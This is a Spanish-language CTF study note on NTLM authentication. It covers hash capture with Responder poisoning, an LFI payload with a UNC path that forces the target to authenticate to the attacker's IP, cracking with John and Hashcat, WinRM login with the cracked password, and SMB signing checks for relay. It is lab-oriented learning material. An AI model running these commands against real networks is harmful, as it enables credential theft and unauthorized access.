---
tags: [windows, cracking]
---

> **NTLM (NT LAN Manager)** es un protocolo de autenticación challenge-response usado en entornos Windows. Esta guía cubre lo que hemos practicado: captura de hashes NTLMv2 con Responder y cracking con John the Ripper.

---

## Quickstart — La cadena NTLM que hemos usado

```bash
# 1. Capturar NTLMv2 hash vía Responder
sudo responder -I tun0

# 2. Crackear el hash capturado
john --format=netntlmv2 hash.txt

# 3. Usar la contraseña para WinRM
netexec winrm 10.10.10.10 -u Administrator -p 'cracked_password' -x 'whoami'
```

---

## NTLM Authentication — Cómo funciona

El protocolo challenge-response NTLM tiene 3 pasos:

| Paso | Dirección | Qué ocurre |
| :--- | :-------- | :--------- |
| **1. Negotiate** | Client → Server | El cliente envía username y dominio |
| **2. Challenge** | Server → Client | El servidor envía un challenge aleatorio de 8 bytes |
| **3. Authenticate** | Client → Server | El cliente computa respuesta HMAC-MD5 usando su NT hash + challenge |

> 💡 **Key insight:** El servidor nunca ve la contraseña en texto plano — solo el challenge-response. Pero un atacante puede **capturar** este response con Responder y **crackearlo** offline.

### NTLMv1 vs NTLMv2

| Característica | NTLMv1 | NTLMv2 |
| :------------- | :----- | :----- |
| Fortaleza criptográfica | Roto (basado en DES) | HMAC-MD5 (más fuerte) |
| Velocidad de cracking | Instantáneo | Minutos a horas |
| Hashcat mode | `-m 5500` | `-m 5600` |
| John format | `netntlm` | `netntlmv2` |
| Prevalencia en CTF | Raro (deprecado) | **El estándar** |

---

## Responder — Captura de hashes

Responder envenena los protocolos de broadcast LLMNR, NBT-NS y mDNS para capturar hashes NTLM.

### Uso básico

```bash
# Iniciar Responder en tu interfaz VPN
$ sudo responder -I tun0

# Modo análisis (pasivo — sin poisoning, solo monitorizar)
$ sudo responder -I tun0 --analyze
```

### Dónde se guardan los hashes capturados

Responder guarda las capturas en `/usr/share/responder/logs/`. Los hashes NTLMv2 están en archivos como `SMB-NTLMv2-*.txt`.

### Escenario CTF típico

```bash
# 1. Iniciar Responder
$ sudo responder -I tun0

# 2. Disparar autenticación NTLM desde el target (ej. vía UNC path en LFI)
#    http://target.htb/?page=\\10.10.14.5\file

# 3. Responder captura:
#    [SMB] NTLMv2-SSP Client   : 10.129.12.192
#    [SMB] NTLMv2-SSP Username : RESPONDER\Administrator
#    [SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:8289f17dc1079a81:...

# 4. Copiar el hash a un archivo y crackear:
$ john --format=netntlmv2 hash.txt
```

---

## Hash Cracking — John the Ripper

### Formato del hash NTLMv2

```
username::domain:ServerChallenge:NTProofStr:NTResponse
```

Ejemplo:
```
admin::WORKGROUP:1122334455667788:a3b4c5d6e7f8091a2b3c4d5e6f708192:0101000000000000...
```

### Crackear con John

```bash
# NTLMv2
$ john --format=netntlmv2 hash.txt

# Con wordlist
$ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Ver resultados
$ john --show hash.txt
```

### Crackear con Hashcat

```bash
# NTLMv2 (mode 5600)
$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# Con reglas para mejor cobertura
$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## SMB Signing — Por qué importa

SMB signing previene ataques de relay NTLM. Hay que verificarlo temprano.

```bash
# Verificar SMB signing con nmap
nmap --script smb2-security-mode -p445 10.129.1.10
# Output:
# | smb2-security-mode:
# |   3.1.1:
# |_    Message signing enabled but not required    → ✅ relayable
```

| Estado de Signing | Qué significa |
| :---------------- | :------------ |
| **Enabled but not required** | Se puede relayar hashes NTLM a este target |
| **Required** | No se puede relayar — crackear el hash |
| **Disabled** | Se puede relayar — común en workstations y Linux/Samba |

> 💡 **De HTB Dancing:** SMB signing estaba *"enabled but not required"* — la máquina era vulnerable a SMB relay si se hubieran capturado credenciales.

---

## 🔗 Related

**Machines:** [[🧑‍🚒 Responder]]

**Guides:** [[🔧 John the Ripper]], [[🖥️ WinRM]], [[📂 SMB]], [[💉 LFI & RFI]]

---

## References

- [The Hacker Recipes — NTLM Relay](https://www.thehacker.recipes/ad/movement/ntlm/relay)
- [HackTricks — NTLM Relay](https://book.hacktricks.xyz/network-services-pentesting/ntlm-relay)
- [Responder GitHub](https://github.com/lgandx/Responder)
- [PortSwigger — NTLM](https://portswigger.net/web-security/ntlm)
